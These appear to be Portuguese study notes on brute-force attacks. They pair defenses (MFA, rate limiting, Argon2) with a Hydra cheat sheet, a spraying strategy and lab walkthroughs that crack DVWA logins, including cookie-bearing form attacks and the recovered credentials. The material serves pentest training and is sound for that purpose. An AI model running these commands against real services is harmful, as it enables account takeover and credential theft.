# Força Bruta

Tentativa sistemática de **adivinhar credenciais ou chaves** testando muitas combinações até encontrar a correta. Não explora uma falha de software; explora **senhas fracas**, **políticas frouxas** e **ausência de controles**.

### Principais formas

* **Online brute force**: tentativas diretas no serviço (SSH, HTTP login, RDP…). É limitado por **lockout**, **rate-limit** e rede. (Ferramentas típicas: Hydra, Medusa.)
* **Offline brute force**: tenta contra **hashes** de senhas previamente obtidos (dump, vazamento). Muito mais rápido, especialmente com **GPU** (hashcat/John). O sucesso depende do algoritmo de hash e da força da senha.
* **Dictionary / Hybrid**: testa listas de senhas comuns e variações (ex.: “Empresa2025!”, “Nome123”).
* **Password spraying**: mesma senha comum em **várias contas** (evita bloquear uma única conta).
* **Credential stuffing**: reutiliza **pares usuário:senha vazados** em outros sites.

### Por que funciona

* Senhas previsíveis, curtas ou reutilizadas.
* Hashes rápidos sem proteção (ex.: SHA-1/SHA-256 puro, sem **salt** e sem fator de custo).

### Sinais e riscos

* Muitas tentativas falhas, picos de autenticação, logins de IPs/dispositivos atípicos.
* Risco de **tomada de conta**, escalada interna, fraudes e vazamento de dados.

### Defesas essenciais

1. **MFA** (TOTP/chaves FIDO2) — quebra o valor de um único segredo.
2. **Política de senha forte** + **bloqueio progressivo** / **rate limiting** / **backoff**.
3. **Detecção & resposta**: alertas por IP/ASN, device fingerprint, geolocalização, UEBA.
4. **Proteja o armazenamento**: use **bcrypt/scrypt/Argon2** com **salt único** e **custo** ajustado; nunca SHA/MD5 puro para senhas.
5. **Passkeys/WebAuthn** onde possível (elimina senha).
6. **Higiene de credenciais**: proibir senhas já vazadas (ex.: listas de “pwned passwords”).
7. **CAPTCHA** ajuda contra bots simples, mas **não substitui** MFA e rate-limit.
8. **Segregar superfícies**: limitar tentativas em interfaces expostas (VPN/SSO), proteger admin com IP allowlist.

---

## Hydra

Ferramenta de **força bruta/ataque de dicionário online** usada em **pentests** para testar credenciais fracas em **serviços de rede**. Diferente de “crackers” offline (ex.: hashcat), o Hydra testa **diretamente no serviço** (SSH, FTP, HTTP, etc.) usando tentativas de login reais.

### Como funciona

* **Conecta** em um serviço/protocolo e tenta combinações de **usuário** e **senha** vindas de **wordlists** ou regras simples de geração.
* Faz isso de forma **massivamente paralela** (várias threads), o que acelera o teste.
* **Módulos** por protocolo implementam o fluxo de autenticação de cada serviço.

### Protocolos (exemplos comuns)

SSH, FTP, Telnet, RDP, SMB, VNC, SNMP, SMTP/POP3/IMAP (mail), HTTP/HTTPS (básico, form-based, auth), LDAP, MySQL/PostgreSQL/Redis/Mongo, entre outros.

### Recursos-chave

* **Paralelismo** configurável (rápido, mas sujeito a travas/lockouts).
* Suporte a **SSL/TLS** e **IPv6**.
* **Proxies** e roteamento (inclui SOCKS/HTTP).
* **Entrada flexível**: listas separadas de usuários (`-L`) e senhas (`-P`) ou pares (`-C`); tentativa de **senha vazia / igual ao usuário** (`-e ns`); **geração simples** de senhas (`-x`).
* **Alvos múltiplos** (`-M`) e **saída** para arquivo (`-o`).
* Interface **gráfica** opcional (**xhydra**) e assistente interativo (**hydra-wizard**).

### Exemplos (ilustrativos)

> Use **apenas** em ambientes sob sua autorização.

```bash
# SSH com listas de usuários e senhas
hydra -L users.txt -P senhas.txt ssh://192.168.1.10 -t 4 -V

# HTTP form-based (indicando campos de login/senha e resposta que indica falha)
hydra -l admin -P senhas.txt 192.168.1.20 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login" -t 6

# RDP
hydra -L users.txt -P senhas.txt rdp://alvo.local -t 3
```

### Limitações e cuidados

* **Ruído/Detecção**: gera muitos requests; **WAF/IDS** e **lockout** de conta podem disparar.
* **Lentidão inerente**: por ser **online**, é mais lento que quebrar **hashes offline**.

### Quando usar (e quando não)

* **Use** para validar **higiene de senhas** em serviços expostos (externos/internos) ou rotas de SSO.
* **Prefira offline** (hashcat/John) quando você já tem **hashes** de senhas.
* Para ambientes críticos, combine com **políticas de senha**, **MFA**, **rate limiting**, **bloqueio progressivo** e **monitoramento**.

## Hydra cheat sheet

### Sintaxe básica

```
hydra [OPÇÕES] PROTOLO://ALVO[:PORTA]
```

Ex.: `hydra -L users.txt -P senhas.txt ssh://192.168.1.10 -t 4 -V`

### Alvo(s)

* **`ALVO` único**: `ssh://10.0.0.5`
* **`-M <arquivo>`**: lista de alvos (um por linha).
* **`-s <porta>`**: porta customizada (se não usar no esquema).
* **`-S`**: força SSL/TLS (quando o módulo suporta).
* **`-6`**: IPv6.

### Credenciais (o coração do Hydra)

* **`-l <user>`**: um usuário fixo.
* **`-L <arquivo>`**: lista de usuários.
* **`-p <senha>`**: uma senha fixa.
* **`-P <arquivo>`**: lista de senhas.
* **`-C <arquivo>`**: pares `usuario:senha` (um por linha).
* **`-e nsr`**: tenta **n** (senha vazia), **s** (senha = usuário), **r** (senha = usuário invertido).
* **`-x <min>:<max>:<charset>`**: gera senhas on-the-fly.

  * Exemplos de *charset*: `1` (dígitos), `a` (minúsculas), `A` (maiúsculas), `!` (símbolos).
  * Ex.: `-x 6:8:aA1` → senhas de 6–8 com letras (a/A) e números.

### Paralelismo, ordem e desempenho

* **`-t <N>`**: número de threads por alvo (tipicamente 4–16).
* **`-u`**: **password spraying** (tenta 1 senha para **todos** os usuários antes da próxima).
* **`-w <seg>`**: *timeout* (segundos) por tentativa (útil em links lentos).
* **`-q`**: silencioso (menos logs).
* **`-v` / `-V`**: verboso / **mostra cada tentativa**.
* **`-d`**: debug.

### Parar quando achar (economiza tempo/ruído)

* **`-f`**: para **após encontrar 1 credencial válida para aquele host**.
* **`-F`**: para **após a primeira credencial válida em qualquer host** (global).

### Entrada/saída e repetibilidade

* **`-o <arquivo>`**: grava resultados em arquivo.
* **`-R`**: retoma sessão anterior (restore).
* **`--continue`** (algumas versões): continua mesmo se encontrar hits cedo (consulte `hydra -h`).

### Módulos de protocolo (dicas rápidas)

* **SSH**: `ssh://host`
* **FTP**: `ftp://host`
* **RDP**: `rdp://host`
* **SMB**: `smb://host`
* **MySQL/Postgres**: `mysql://host`, `postgres://host`
* **HTTP(s)**:

  * **Basic/Digest/NTLM**: `http[s]-head`/`http[s]-get`/`http[s]-post` conforme o módulo.
  * **Form-based**: `http[s]-get-form` ou `http[s]-post-form`.

👉 **Dica de ouro**: use **`-U <módulo>`** para ver a **ajuda específica** do módulo.
Ex.: `hydra -U http-post-form`

## HTTP form-based (padrão do dia a dia)

Formato (módulos `http[s]-post-form` / `http[s]-get-form`):

```
"/caminho:campoUsuario=^USER^&campoSenha=^PASS^:string_que_indica_falha"
```

Exemplos:

```bash
# POST de login com string de falha "Invalid login"
hydra -l admin -P senhas.txt 192.168.1.20 \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid login" -t 6 -V

# GET form (mais raro), checando "Erro" na resposta
hydra -L users.txt -P wordlist.txt alvo.local \
  http-get-form "/auth?u=^USER^&p=^PASS^:Erro" -t 8 -f
```

Outras dicas HTTP:

* Se a **string de sucesso** for mais confiável, troque a terceira parte por ela com `S=` (ver `-U http-post-form`).
* Para **redirecionamento** após sucesso, às vezes vale usar um **regex** na terceira parte.

## Exemplos rápidos por protocolo

```bash
# SSH (threads 4, mostra cada tentativa)
hydra -L users.txt -P senhas.txt ssh://10.0.0.5 -t 4 -V

# RDP
hydra -L users.txt -P senhas.txt rdp://alvo.local -t 3 -f

# SMB
hydra -L users.txt -P senhas.txt smb://192.168.1.50 -t 6

# MySQL
hydra -L users.txt -P senhas.txt mysql://db.interno -t 6 -f

# Múltiplos alvos (arquivo com hosts)
hydra -L users.txt -P senhas.txt -M hosts.txt ssh -t 6 -F
```

## Estratégia prática

* **Spray** primeiro (`-u`) com um pequeno set de senhas “corporativas” comuns.
* Depois, **aprofundar** com wordlists maiores (rockyou, custom corporativa) e `-t` mais alto — respeitando lockout/rate-limit.
* Para HTTPs complexos (token/headers), prefira **Burp** para entender o fluxo e ajustar o **formato do módulo**.

### Etiqueta/segurança operacional

* Combine **limites** (tentativas/minuto), **janelas** e horários com o cliente.
* Monitore **lockouts** e **WAF/IDS**.
* Registre **fonte, escopo e autorização**; salve `-o` como evidência.

Se quiser, monto uma **planilha de execução** (alvos, módulos, flags, wordlists, limites e resultados) ou um **script shell** que roda lotes de testes com `-M`, organiza saídas e faz **resume** automático com `-R`.

## Wordlists

- **SecLists**: Um dos repositórios mais completos e respeitados. Ele inclui listas de usuários, senhas, URLs, payloads e muito mais.
  - GitHub: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

- **Kali Linux**: Se você estiver usando Kali, ele já vem com várias wordlists pré-instaladas, como:
  - `/usr/share/wordlists/rockyou.txt` — uma lista famosa de senhas reais vazadas (descompacte com `gunzip` se necessário).

- **Weakpass**: Um projeto que reúne senhas fracas e comuns usadas em ataques de força bruta.
  - Site: [https://weakpass.com/](https://weakpass.com/)

---

## Ataque a página principal do DVWA

Inspecionando a página...
```
<form action="login.php" method="post">	
	<fieldset>
			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />
			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />		
			<p class="submit"><input type="submit" value="Login" name="Login"></p>
	</fieldset>
	</form>
```
...observamos que as informações são passadas por um formulário através dos campos username e password, e submetidas pelo botão Login.

O **comando padrão** para o ataque **http-form-post** é:
```
$ hydra L <LISTA_DE_USERNAMES> -P <LISTA_DE_SENHAS> <IP> http-form-post "<PATH_ARCHIVE>:<CAMPO_USER>=^USER^&<CAMPO_SENHA>=^PASS^&<NOME_BOTÃO>=submit:<AVISO_DE_FALHA>" -
```
* Utilizaremos arquivos de usernames e passwords pequenos para fins de velocidade na execução do exercício.
```
$ hydra 192.168.1.33 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -L usernames.txt -P passwords.txt

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 17:10:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:8/p:7), ~4 tries per task
[DATA] attacking http-post-form://192.168.1.33:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed
[80][http-post-form] host: 192.168.1.33   login: admin   password: password
[80][http-post-form] host: 192.168.1.33   login: Admin   password: password
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-03 17:10:55
```
O Hydra achou dois logins válidos (a partir da lista).

---

## Ataque a página /dvwa/vulnerabilities/brute/ 

Inspencionando a página...
```
	<form action="#" method="GET">
			Username:<br><input type="text" name="username"><br>
			Password:<br><input type="password" AUTOCOMPLETE="off" name="password"><br>
			<input type="submit" value="Login" name="Login">
		</form>
```
...observamos que é praticamente igual a anterior, trocando:
* O método para GET
* O aviso de erro
Contudo, executando o comando com as modificações...
```
$ hydra 192.168.1.33 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=submit:Username and/or password incorrect." -L usernames.txt -P passwords.txt
```
... todas as tentativas retornam como sucesso, indicando que algo falta ou não está correto no comando.

Usando o Burp Suite para verificar o fluxo, observamos que existe um cookie de sessão.
```
GET /dvwa/vulnerabilities/brute/?username=ccwdcqwd&password=cwdqqw&Login=Login HTTP/1.1
Host: 192.168.1.33
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.33/dvwa/vulnerabilities/brute/
Accept-Encoding: gzip, deflate, br
Cookie: security=high; security=low; PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824
Connection: keep-alive
```
Assim, é necessário incluir o cookie de sessão no comando hydra. O **comando padrão** para o ataque **http-form-get** com **cookie** é:
```
$ hydra L <LISTA_DE_USERNAMES> -P <LISTA_DE_SENHAS> <IP> http-form-post "<PATH_ARCHIVE>:<CAMPO_USER>=^USER^&<CAMPO_SENHA>=^PASS^&<NOME_BOTÃO>=submit:H=Cookie\:PHPSESSID=<COOKIE>:<AVISO_DE_FALHA>" -
```
* **Todos os dois pontos (:) que não forem separadores de opções devem ser escapados por uma barra invertida (\)**.
 * Se você for usar dois pontos (:) nos seus cabeçalhos, use uma barra invertida (\) como escape.

Executando o comando hydra:
```
$ hydra -L usernames.txt -P passwords.txt 192.168.1.33 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824:Username and/or password incorrect."

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-03 20:56:02
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:8/p:7), ~4 tries per task
[DATA] attacking http-get-form://192.168.1.33:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=ae49c4cec2fe60067eddfe55ea9e2824:Username and/or password incorrect.
[80][http-get-form] host: 192.168.1.33   login: Admin   password: password
[80][http-get-form] host: 192.168.1.33   login: admin   password: password
[STATUS] 37.00 tries/min, 37 tries in 00:01h, 19 to do in 00:01h, 16 active
[STATUS] 28.00 tries/min, 56 tries in 00:02h, 1 to do in 00:01h, 15 active
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-03 20:58:47
```
O comando é executado com sucesso, como dois resultados positivos.
